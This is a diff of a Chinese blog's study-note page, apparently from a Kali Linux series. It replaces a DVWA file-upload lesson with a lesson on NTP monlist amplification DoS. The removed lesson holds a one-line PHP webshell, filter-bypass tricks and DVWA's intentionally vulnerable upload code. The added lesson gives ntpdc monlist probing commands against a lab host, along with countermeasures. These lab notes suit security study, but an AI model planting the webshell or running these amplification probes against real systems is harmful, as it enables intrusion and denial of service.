@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="1. 手动漏洞挖掘  直接上传webshell 修改文件类型上传webshell Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg） 一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名   修改扩展名上传webshell 静态解析文件扩展名时可能无法执行   文件头绕过过滤上传webshell 上传目录权限（上传权限限制，限制上传文件执行） DVWA的Upl">
+<meta name="description" content="1. NTP放大攻击 网络时间协议 Network Time Protocol  保证网络设备时间同步 电子设备互相干扰导致时钟差异越来越大 服务端口UDP 123 ▲ SSL证书的时间戳 ▲ 影响应用正常运行、日志审计不可信   攻击原理 NTP服务提monlist（MON_GETLIST）查询功能 监控NTP服务器的状态   客户端查询时，NTP服务器返回最后同步时间的600个客户端IP 每">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;08&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(八十五)：DoS--NTP放大">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;10&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 手动漏洞挖掘  直接上传webshell 修改文件类型上传webshell Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg） 一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名   修改扩展名上传webshell 静态解析文件扩展名时可能无法执行   文件头绕过过滤上传webshell 上传目录权限（上传权限限制，限制上传文件执行） DVWA的Upl">
+<meta property="og:description" content="1. NTP放大攻击 网络时间协议 Network Time Protocol  保证网络设备时间同步 电子设备互相干扰导致时钟差异越来越大 服务端口UDP 123 ▲ SSL证书的时间戳 ▲ 影响应用正常运行、日志审计不可信   攻击原理 NTP服务提monlist（MON_GETLIST）查询功能 监控NTP服务器的状态   客户端查询时，NTP服务器返回最后同步时间的600个客户端IP 每">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-15T06:11:28.678Z">
+<meta property="og:updated_time" content="2020-02-10T14:47:05.750Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -118,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/01/08/Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/10/Kali Linux笔记(八十五)：DoS--NTP放大/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传 | Tomas'Blog</title>
+  <title>Kali Linux笔记(八十五)：DoS--NTP放大 | Tomas'Blog</title>
   
 
 
@@ -243,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(八十五)：DoS--NTP放大</h1>
         
 
         <div class="post-meta">
@@ -272,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-10T22:47:15+08:00">
+                2020-02-10
               </time>
             
 
@@ -326,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  753 字
+                  365 字
                 </span>
               
 
@@ -342,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  1 分钟
                 </span>
               
             </div>
@@ -364,53 +364,64 @@
 
       
         <hr>
-<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><ul>
-<li><?php echo shell_exec($_GET['cmd']);?></li>
-<li>直接上传webshell</li>
-<li>修改文件类型上传webshell<ul>
-<li>Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg）</li>
-<li>一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名</li>
+<h4 id="1-NTP放大攻击"><a href="#1-NTP放大攻击" class="headerlink" title="1. NTP放大攻击"></a>1. NTP放大攻击</h4><ul>
+<li>网络时间协议<ul>
+<li>Network Time Protocol </li>
+<li>保证网络设备时间同步</li>
+<li>电子设备互相干扰导致时钟差异越来越大</li>
+<li>服务端口UDP 123</li>
+<li>▲ SSL证书的时间戳</li>
+<li>▲ 影响应用正常运行、日志审计不可信</li>
 </ul>
 </li>
-<li>修改扩展名上传webshell<ul>
-<li>静态解析文件扩展名时可能无法执行</li>
+<li>攻击原理<ul>
+<li>NTP服务提monlist（MON_GETLIST）查询功能<ul>
+<li>监控NTP服务器的状态</li>
 </ul>
 </li>
-<li>文件头绕过过滤上传webshell</li>
-<li>上传目录权限（上传权限限制，限制上传文件执行）</li>
-<li>DVWA的Upload（low）：<ul>
-<li>1.正常上传一张图片（.jpg,.png等图片文件，图片不能太大）</li>
-<li>2.<strong><code>🔺命令：vi 1.php</code></strong>（<?php echo shell_exec($_GET['cmd']);?>）</li>
-<li>3.可以正常上传，传入参数：?cmd=id（url中访问1.php）</li>
-<li>▲ 绕过方法：1.上传php 2.修改请求头MAX_SIZE的大小进行重放</li>
+<li>客户端查询时，NTP服务器返回最后同步时间的600个客户端IP<ul>
+<li>每6个IP一个数据包，最多100个数据包（放大约100倍）</li>
 </ul>
 </li>
+<li>放大效果看monlist的地址列表</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">        $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">        $target_path = $target_path.basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">        if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;].$target_path))&#123;</span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo $target_path.&apos;successfully uploaded!&apos;;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的Upload（medium）：<ul>
-<li>正常上传一张1.png文件，但不能正常上传，需要image/jpeg文件</li>
-<li>▲ 绕过方法：修改请求头的Content-type为image/jpeg进行重放</li>
+</li>
+<li>攻击对策<ul>
+<li>升级到ntpd 4.2.7p26及以上的版本（默认关闭monlist查询）</li>
+<li>收到关闭monlist查询功能</li>
 </ul>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">            if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的Upload（high）：<ul>
-<li>▲ 绕过方法：修改请求头中的filename为1.php.jpg进行重放</li>
-<li>防护方法：更严格防护判断文件传输body中对文件类型的定义（但仍不安全）</li>
+<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
+<li>Bodhi（被攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：sudo apt-get install ntp</code></strong></li>
+<li><strong><code>🔺命令：netstat -pantu | grep 123</code></strong>（查看ntp服务是否开启）</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li>发现NTP服务：<strong><code>🔺命令：nmap -sU -p123 Bodhi的IP</code></strong></li>
+<li>发现漏洞<ul>
+<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（timeout）</li>
 </ul>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            else&#123;</span><br><span class="line">                </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的Upload（more high）：<ul>
-<li>防护判断文件传输body中对文件类型的定义</li>
-<li>▲ 绕过方法：1.找一张jpeg的图片，修改请求头中的filename为1.php.jpg 2.删除body中的jpeg图片中相关像素的信息，替换为webshell 3.进行重放</li>
-<li>防护方法：修改上一次目录的属主等其他用户的执行权限（权限为620–无执行权限）</li>
+</li>
+<li>Bodhi（被攻击者）<ul>
+<li><strong><code>🔺命令：vi /etc/ntp.conf</code></strong> <ul>
+<li>#restrict -4 default kod nomodify notrap nopeer noquery </li>
+<li>#restrict -6 default kod nomodify notrap nopeer noquery</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：service ntp stop/start</code></strong></li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（可查询到monlist地址表）</li>
+<li><strong><code>🔺命令：ntpq -c rv Bodhi的IP</code></strong>（查询Bodhi的系统信息）</li>
+<li><strong><code>🔺命令：ntpdc -c sysinfo Bodhi的IP</code></strong>（查询Bodhi的sysinfo）</li>
+<li>▲ 2020.2.10 无法查到monlist地址表，但能查到Bodhi得系统信息</li>
 </ul>
 </li>
 </ul>
@@ -444,8 +455,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含
+              <a href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/" rel="next" title="Kali Linux笔记(八十四)：DoS--SNMP放大">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(八十四)：DoS--SNMP放大
               </a>
             
           </div>
@@ -453,10 +464,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/" rel="prev" title="Kali Linux笔记(四十四)：手动漏洞挖掘--默认安装存在漏洞">
-                Kali Linux笔记(四十四)：手动漏洞挖掘--默认安装存在漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -626,7 +633,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-手动漏洞挖掘"><span class="nav-number">1.</span> <span class="nav-text">1. 手动漏洞挖掘</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-NTP放大攻击"><span class="nav-number">1.</span> <span class="nav-text">1. NTP放大攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-实验"><span class="nav-number">2.</span> <span class="nav-text">2. 实验</span></a></li></ol></div>
             
 
           </div>
